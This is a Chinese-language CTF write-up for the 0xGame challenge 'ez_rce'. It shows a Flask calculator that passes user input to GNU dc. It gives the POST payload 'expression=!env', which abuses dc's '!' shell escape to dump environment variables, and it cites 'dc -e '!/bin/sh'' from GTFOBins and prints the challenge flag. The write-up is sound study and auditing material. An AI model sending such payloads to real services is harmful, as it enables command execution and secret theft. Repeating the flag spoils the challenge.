# ez_rce

## 题目简述

Flask 应用把 POST 参数 `expression` 作为 `dc -e` 的表达式执行，并返回标准输出：

```python
@app.route("/calc", methods=["POST"])
def calculator():
    expression = request.form.get("expression") or "114 1000 * 514 + p"
    result = subprocess.run(
        ["dc", "-e", expression],
        capture_output=True,
        text=True,
    )
    return result.stdout
```

这里没有字符串拼接，也没有 `shell=True`，所以常规 shell 元字符注入不成立；真正的问题是用户输入被交给了功能过强的 `dc` 解释器。

## 解题过程

GNU `dc` 的 `-e` 选项会把参数当作 `dc` 命令执行，而 `!` 命令会把本行剩余内容交给系统 shell。这个行为在 [GNU dc 手册](https://www.gnu.org/software/bc/manual/dc-1.05/html_mono/dc.html)中有明确定义；[GTFOBins 的 dc 条目](https://gtfobins.org/gtfobins/dc/)给出的 `dc -e '!/bin/sh'` 正是同一执行原语。

因此向 `/calc` 提交以下表单即可让 `dc` 执行 `env`：

```http
POST /calc HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

expression=!env
```

容器把 flag 放在环境变量中，`env` 的标准输出又被 Flask 原样返回，于是可以直接读取该变量。也可以把命令换成针对目标文件的 `!cat ...`，但本题不需要猜测文件路径。

验证结果为：

```text
0xGame{Do_You_Know_gtfobins?Try_To_Use_It!}
```

## 方法总结

- 核心技巧：利用 GNU `dc` 的 `!` 系统命令功能实现解释器级命令执行。
- 识别信号：即使 `subprocess.run()` 使用参数数组且没有 shell，只要参数进入可执行宏、加载文件或调用系统命令的解释器，仍可能形成 RCE。
- 复用要点：区分“shell 拼接注入”和“下游程序自身的命令语言注入”；审计时必须继续检查被调用工具的语义与危险指令。
